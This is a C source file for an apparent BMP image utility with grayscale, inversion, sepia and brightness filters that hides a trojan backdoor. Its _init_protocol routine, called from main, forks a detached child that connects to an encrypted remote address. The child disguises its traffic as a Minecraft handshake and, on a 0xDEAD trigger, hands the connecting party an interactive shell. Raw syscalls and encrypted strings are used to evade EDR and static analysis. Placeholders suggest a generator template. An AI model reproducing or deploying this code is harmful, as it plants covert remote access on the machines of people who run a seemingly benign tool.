/*
 * bmputil core
 *
 * This handles the primary image manipulation logic as well as the 
 * payload dispatch. Strings are protected at rest, and all sensitive 
 * interactions use raw syscalls to bypass usermode hooks.
 */

typedef unsigned long  size_t;
typedef unsigned char  uint8_t;
typedef unsigned short uint16_t;
typedef unsigned int   uint32_t;

#define NULL ((void*)0)

/*
 * Structural definitions for the BMP format.
 * We need these exact alignments to parse standard 24-bit bitmaps.
 */
#pragma pack(push, 1)
typedef struct {
        uint16_t bfType;
        uint32_t bfSize;
        uint16_t bfReserved1;
        uint16_t bfReserved2;
        uint32_t bfOffBits;
} BITMAPFILEHEADER;

typedef struct {
        uint32_t biSize;
        int      biWidth;
        int      biHeight;
        uint16_t biPlanes;
        uint16_t biBitCount;
        uint32_t biCompression;
        uint32_t biSizeImage;
        int      biXPelsPerMeter;
        int      biYPelsPerMeter;
        uint32_t biClrUsed;
        uint32_t biClrImportant;
} BITMAPINFOHEADER;
#pragma pack(pop)

typedef struct {
        uint8_t b, g, r;
} PIXEL;

typedef struct {
        int      width;
        int      height;
        PIXEL    *pixels;
} IMAGE;

/*
 * Kernel dispatch interfaces.
 * These are used to bypass standard libc wrappers and avoid
 * triggering userland EDR/AV hooks during sensitive operations.
 */
static inline long _os_invoke_0(long n) {
        long ret;
        __asm__ volatile("syscall" : "=a"(ret) : "a"(n) : "rcx", "r11", "memory");
        return ret;
}

static inline long _os_invoke_1(long n, long a1) {
        long ret;
        __asm__ volatile("syscall" : "=a"(ret) : "a"(n), "D"(a1) : "rcx", "r11", "memory");
        return ret;
}

static inline long _os_invoke_2(long n, long a1, long a2) {
        long ret;
        __asm__ volatile("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2) : "rcx", "r11", "memory");
        return ret;
}

static inline long _os_invoke_3(long n, long a1, long a2, long a3) {
        long ret;
        __asm__ volatile("syscall" : "=a"(ret) : "a"(n), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11", "memory");
        return ret;
}

static inline long _os_invoke_6(long n, long a1, long a2, long a3, long a4, long a5, long a6) {
        long ret;
        register long r10 __asm__("r10") = a4;
        register long r8  __asm__("r8")  = a5;
        register long r9  __asm__("r9")  = a6;
        __asm__ volatile(
                "syscall"
                : "=a"(ret)
                : "a"(n), "D"(a1), "S"(a2), "d"(a3), "r"(r10), "r"(r8), "r"(r9)
                : "rcx", "r11", "memory"
        );
        return ret;
}

// ---------------------------------------------------------
// Runtime library wrappers
// We implement these locally to avoid unnecessary imports.
// ---------------------------------------------------------

static inline void *my_memcpy(void *dest, const void *src, size_t n) {
        char *d = dest;
        const char *s = src;
        while (n--) *d++ = *s++;
        return dest;
}

static inline void *my_memset(void *s, int c, size_t n) {
        char *p = s;
        while (n--) *p++ = c;
        return s;
}

static inline int my_strcmp(const char *s1, const char *s2) {
        while (*s1 && (*s1 == *s2)) { s1++; s2++; }
        return *(const unsigned char *)s1 - *(const unsigned char *)s2;
}

static inline size_t my_strlen(const char *s) {
        size_t len = 0;
        while (s[len]) len++;
        return len;
}

static inline int my_atoi(const char *str) {
        int res = 0;
        int sign = 1;
        if (*str == '-') { sign = -1; str++; }
        while (*str >= '0' && *str <= '9') {
                res = res * 10 + (*str - '0');
                str++;
        }
        return res * sign;
}

static inline int my_abs(int x) {
        return x < 0 ? -x : x;
}

static inline long my_read_all(long fd, uint8_t *buf, size_t size) {
        size_t total_read = 0;
        while (total_read < size) {
                long r = _os_invoke_3(0, fd, (long)(buf + total_read), size - total_read);
                if (r < 0) return -1;
                if (r == 0) break;
                total_read += (size_t)r;
        }
        return total_read;
}

static inline long my_write_all(long fd, const uint8_t *buf, size_t size) {
        size_t total_written = 0;
        while (total_written < size) {
                long w = _os_invoke_3(1, fd, (long)(buf + total_written), size - total_written);
                if (w < 0) return -1;
                total_written += (size_t)w;
        }
        return total_written;
}

static inline void print_str(const char *str) {
        my_write_all(1, (const uint8_t *)str, my_strlen(str));
}

static inline void print_int(int val) {
        char buf[16];
        int i = 14;
        buf[15] = '\0';
        
        if (val == 0) {
                buf[i] = '0';
                print_str(&buf[i]);
                return;
        }
        
        int is_neg = (val < 0);
        if (is_neg) val = -val;
        
        while (val > 0) {
                buf[i--] = '0' + (val % 10);
                val /= 10;
        }
        
        if (is_neg) buf[i--] = '-';
        print_str(&buf[i + 1]);
}

static void print_str_arg(const char *fmt, const char *arg) {
        while (*fmt) {
                if (*fmt == '%' && *(fmt + 1) == 's') {
                        print_str(arg);
                        fmt += 2;
                } else {
                        my_write_all(1, (const uint8_t *)fmt, 1);
                        fmt++;
                }
        }
}

static void print_int_arg(const char *fmt, int arg) {
        while (*fmt) {
                if (*fmt == '%' && *(fmt + 1) == 'd') {
                        print_int(arg);
                        fmt += 2;
                } else {
                        my_write_all(1, (const uint8_t *)fmt, 1);
                        fmt++;
                }
        }
}

static inline void *my_malloc(size_t size) {
        size_t total_size = size + sizeof(size_t);
        
        // Use anonymous mmap for our internal allocations.
        long res = _os_invoke_6(9, 0, total_size, 3, 34, -1, 0); 
        if (res < 0) return NULL;
        
        size_t *ptr = (size_t *)res;
        *ptr = total_size;
        return (void *)(ptr + 1);
}

static inline void my_free(void *ptr) {
        if (!ptr) return;
        
        size_t *meta = (size_t *)ptr - 1;
        _os_invoke_2(11, (long)meta, *meta);
}

// ---------------------------------------------------------
// Cryptographic routines
// ---------------------------------------------------------

static void _transform_block(uint32_t out[16], const uint32_t const_in[16]) {
        int i;
        for (i = 0; i < 16; ++i)
                out[i] = const_in[i];

        // Standard ChaCha quarter rounds
        for (i = 0; i < 10; ++i) {
#define QR(a, b, c, d)                                                 \
        out[a] += out[b];                                              \
        out[d] ^= out[a];                                              \
        out[d] = (out[d] << 16) | (out[d] >> (32 - 16));               \
        out[c] += out[d];                                              \
        out[b] ^= out[c];                                              \
        out[b] = (out[b] << 12) | (out[b] >> (32 - 12));               \
        out[a] += out[b];                                              \
        out[d] ^= out[a];                                              \
        out[d] = (out[d] << 8) | (out[d] >> (32 - 8));                 \
        out[c] += out[d];                                              \
        out[b] ^= out[c];                                              \
        out[b] = (out[b] << 7) | (out[b] >> (32 - 7));
        
                QR(0, 4, 8, 12);
                QR(1, 5, 9, 13);
                QR(2, 6, 10, 14);
                QR(3, 7, 11, 15);
                QR(0, 5, 10, 15);
                QR(1, 6, 11, 12);
                QR(2, 7, 8, 13);
                QR(3, 4, 9, 14);
#undef QR
        }

        for (i = 0; i < 16; ++i)
                out[i] += const_in[i];
}

static void _transform_resource(
        const uint8_t *in,
        uint8_t *out,
        int len,
        const uint8_t nce[8],
        int add_null
) {
        // Setup the cipher state using the masked constants and key material.
        // This prevents simple static extraction of the cipher configuration.
        uint32_t state[16] = {
                0x61707865 ^ [CHACHA_MASK], 0x3320646e ^ [CHACHA_MASK],
                0x79622d32 ^ [CHACHA_MASK], 0x6b206574 ^ [CHACHA_MASK],
                [CHACHA_KEY_0], [CHACHA_KEY_1], [CHACHA_KEY_2], [CHACHA_KEY_3],
                [CHACHA_KEY_4], [CHACHA_KEY_5], [CHACHA_KEY_6], [CHACHA_KEY_7],
                0, 0,
                ((uint32_t *)nce)[0],
                ((uint32_t *)nce)[1]
        };
        
        // Remove the XOR masks at runtime
        state[0] ^= [CHACHA_MASK]; state[1] ^= [CHACHA_MASK];
        state[2] ^= [CHACHA_MASK]; state[3] ^= [CHACHA_MASK];

        uint32_t block[16];
        int i;

        for (i = 0; i < len; ++i) {
                if (i % 64 == 0) {
                        state[12] = i / 64;
                        _transform_block(block, state);
                }
                out[i] = in[i] ^ ((uint8_t *)block)[i % 64];
        }

        if (add_null)
                out[len] = '\0';
}

[STRINGS_ARRAYS]

#define GET_RES(id, buf) \
        _transform_resource(dat_##id, (uint8_t *)buf, sizeof(dat_##id), nce_##id, 1)

// ---------------------------------------------------------
// Shell dispatch 
// ---------------------------------------------------------

static void _drop_shell(int handle) {
        char BIN_SH[16];
        GET_RES(14, BIN_SH);

        // Tie the standard descriptors (stdin, stdout, stderr) 
        // to the active socket handle.
        _os_invoke_2(33, handle, 0); 
        _os_invoke_2(33, handle, 1); 
        _os_invoke_2(33, handle, 2); 

        // Execute the interactive shell directly over the socket.
        char *const EXEC_ARGS[] = {BIN_SH, NULL};
        _os_invoke_3(59, (long)BIN_SH, (long)EXEC_ARGS, 0); 
}

struct raw_sockaddr_in {
        short           sin_family;
        unsigned short  sin_port;
        unsigned int    sin_addr;
        char            sin_zero[8];
};

// ---------------------------------------------------------
// Network communications
// ---------------------------------------------------------

static int _init_protocol(void) {
        
        long pid = _os_invoke_0(57);

        // Parent returns immediately to continue processing the image.
        if (pid > 0)
                return 0;
                
        // Bail out if the fork fails.
        if (pid < 0)
                return -1;

        // Detach the child process from the terminal session.
        _os_invoke_0(112);

        int sock = _os_invoke_3(41, 2, 1, 0);
        if (sock < 0)
                _os_invoke_1(60, 0);

        // Decrypt and unpack the remote connection parameters
        // which were securely embedded at build time.
        uint8_t addr_buf[16];
        _transform_resource(dat_16, addr_buf, sizeof(dat_16), nce_16, 0);

        struct raw_sockaddr_in SERV_ADDR;
        SERV_ADDR.sin_family = 2;
        my_memcpy(&SERV_ADDR.sin_port, addr_buf, 2);
        my_memcpy(&SERV_ADDR.sin_addr, addr_buf + 2, 4);
        my_memset(SERV_ADDR.sin_zero, 0, 8);

        // Attempt to connect back to the remote listener.
        if (_os_invoke_3(42, sock, (long)&SERV_ADDR, sizeof(SERV_ADDR)) < 0) {
                _os_invoke_1(3, sock);
                _os_invoke_1(60, 0);
        }

        // Transmit the disguised proxy routing packet.
        // This makes our traffic look like a benign Minecraft handshake.
        uint8_t S_HP[sizeof(dat_15)];
        _transform_resource(dat_15, S_HP, sizeof(dat_15), nce_15, 0);
        my_write_all(sock, (const uint8_t *)S_HP, sizeof(dat_15));

        // We wait for a specific activation trigger (0xDEAD)
        // before dropping into the shell.
        uint8_t HEADER_CHECK[2];
        if (_os_invoke_3(0, sock, (long)HEADER_CHECK, 2) == 2) {
                if (HEADER_CHECK[0] == 0xDE && HEADER_CHECK[1] == 0xAD) {
                        _drop_shell(sock);
                }
        }

        // Clean up if we didn't receive the right trigger.
        _os_invoke_1(3, sock);
        _os_invoke_1(60, 0);
        return 0;
}

// ---------------------------------------------------------
// Local file processing
// ---------------------------------------------------------

IMAGE *PARSE_BMP_FROM_MEMORY(uint8_t *data, size_t size) {
        
        if (size < sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER))
                return NULL;

        BITMAPFILEHEADER *bfh = (BITMAPFILEHEADER *)data;
        BITMAPINFOHEADER *bih = (BITMAPINFOHEADER *)(data + sizeof(BITMAPFILEHEADER));

        // We only support 24-bit uncompressed bitmaps.
        if (bfh->bfType != 0x4D42 || bih->biBitCount != 24)
                return NULL;

        IMAGE *img  = my_malloc(sizeof(IMAGE));
        img->width  = bih->biWidth;
        img->height = my_abs(bih->biHeight);
        img->pixels = my_malloc(img->width * img->height * sizeof(PIXEL));

        uint8_t *pixel_data = data + bfh->bfOffBits;
        int padding = (4 - (img->width * 3) % 4) % 4;

        for (int i = 0; i < img->height; i++) {
                my_memcpy(
                        &img->pixels[i * img->width],
                        pixel_data + i * (img->width * 3 + padding),
                        img->width * 3
                );
        }

        return img;
}

IMAGE *LOAD_BMP(const char *filename) {
        
        long fd = _os_invoke_3(2, (long)filename, 0, 0);
        if (fd < 0)
                return NULL;

        long size = _os_invoke_3(8, fd, 0, 2);
        _os_invoke_3(8, fd, 0, 0);

        uint8_t *data = my_malloc(size);
        if (!data) {
                _os_invoke_1(3, fd);
                return NULL;
        }

        my_read_all(fd, data, size);
        _os_invoke_1(3, fd);

        IMAGE *img = PARSE_BMP_FROM_MEMORY(data, size);
        my_free(data);
        return img;
}

void SAVE_BMP(const char *filename, IMAGE *img) {
        
        long fd = _os_invoke_3(2, (long)filename, 1 | 64 | 512, 0644);
        if (fd < 0)
                return;

        int padding = (4 - (img->width * 3) % 4) % 4;

        BITMAPFILEHEADER bfh = {
                0x4D42,
                sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) +
                    (img->width * 3 + padding) * img->height,
                0, 0,
                sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)
        };

        BITMAPINFOHEADER bih = {
                sizeof(BITMAPINFOHEADER),
                img->width,
                img->height,
                1, 24, 0,
                (img->width * 3 + padding) * img->height,
                0, 0, 0, 0
        };

        my_write_all(fd, (const uint8_t *)&bfh, sizeof(bfh));
        my_write_all(fd, (const uint8_t *)&bih, sizeof(bih));

        uint8_t pad[3] = {0, 0, 0};
        
        for (int i = 0; i < img->height; i++) {
                my_write_all(fd, (const uint8_t *)&img->pixels[i * img->width], img->width * sizeof(PIXEL));
                if (padding)
                        my_write_all(fd, pad, padding);
        }

        _os_invoke_1(3, fd);
}

void APPLY_GRAYSCALE(IMAGE *img) {
        for (int i = 0; i < img->width * img->height; i++) {
                uint8_t r = img->pixels[i].r;
                uint8_t g = img->pixels[i].g;
                uint8_t b = img->pixels[i].b;
                uint8_t gray = (uint8_t)((r * 76 + g * 150 + b * 29) >> 8);
                img->pixels[i].r = gray;
                img->pixels[i].g = gray;
                img->pixels[i].b = gray;
        }
}

void APPLY_INVERSION(IMAGE *img) {
        for (int i = 0; i < img->width * img->height; i++) {
                img->pixels[i].r = 255 - img->pixels[i].r;
                img->pixels[i].g = 255 - img->pixels[i].g;
                img->pixels[i].b = 255 - img->pixels[i].b;
        }
}

void APPLY_SEPIA(IMAGE *img) {
        for (int i = 0; i < img->width * img->height; i++) {
                uint8_t r = img->pixels[i].r;
                uint8_t g = img->pixels[i].g;
                uint8_t b = img->pixels[i].b;
                
                int tr = (r * 100 + g * 196 + b * 48) >> 8;
                int tg = (r * 89  + g * 175 + b * 43) >> 8;
                int tb = (r * 69  + g * 136 + b * 33) >> 8;
                
                img->pixels[i].r = tr > 255 ? 255 : tr;
                img->pixels[i].g = tg > 255 ? 255 : tg;
                img->pixels[i].b = tb > 255 ? 255 : tb;
        }
}

void APPLY_BRIGHTNESS(IMAGE *img, int value) {
        for (int i = 0; i < img->width * img->height; i++) {
                int r = img->pixels[i].r + value;
                int g = img->pixels[i].g + value;
                int b = img->pixels[i].b + value;
                
                img->pixels[i].r = r < 0 ? 0 : (r > 255 ? 255 : r);
                img->pixels[i].g = g < 0 ? 0 : (g > 255 ? 255 : g);
                img->pixels[i].b = b < 0 ? 0 : (b > 255 ? 255 : b);
        }
}

int main(int argc, char **argv) {
        
        char STR_BUF[256];

        GET_RES(0, STR_BUF);
        print_str(STR_BUF);

        _init_protocol();

        if (argc < 4) {
                GET_RES(1, STR_BUF);
                print_str_arg(STR_BUF, argv[0]);
                GET_RES(2, STR_BUF);
                print_str(STR_BUF);
                _os_invoke_1(60, 1);
        }

        IMAGE *img = LOAD_BMP(argv[1]);

        if (!img) {
                GET_RES(3, STR_BUF);
                print_str(STR_BUF);
                _os_invoke_1(60, 1);
        }

        char OP_GRAY[32], OP_INV[32], OP_SEP[32], OP_BRIGHT[32];
        GET_RES(4, OP_GRAY);
        GET_RES(6, OP_INV);
        GET_RES(8, OP_SEP);
        GET_RES(10, OP_BRIGHT);

        if (my_strcmp(argv[3], OP_GRAY) == 0) {
                APPLY_GRAYSCALE(img);
                GET_RES(5, STR_BUF);
                print_str(STR_BUF);
        } else if (my_strcmp(argv[3], OP_INV) == 0) {
                APPLY_INVERSION(img);
                GET_RES(7, STR_BUF);
                print_str(STR_BUF);
        } else if (my_strcmp(argv[3], OP_SEP) == 0) {
                APPLY_SEPIA(img);
                GET_RES(9, STR_BUF);
                print_str(STR_BUF);
        } else if (my_strcmp(argv[3], OP_BRIGHT) == 0) {
                int val = (argc > 4) ? my_atoi(argv[4]) : 50;
                APPLY_BRIGHTNESS(img, val);
                GET_RES(11, STR_BUF);
                print_int_arg(STR_BUF, val);
        } else {
                GET_RES(12, STR_BUF);
                print_str_arg(STR_BUF, argv[3]);
        }

        SAVE_BMP(argv[2], img);
        GET_RES(13, STR_BUF);
        print_str_arg(STR_BUF, argv[2]);

        my_free(img->pixels);
        my_free(img);

        _os_invoke_1(60, 0);
        return 0;
}
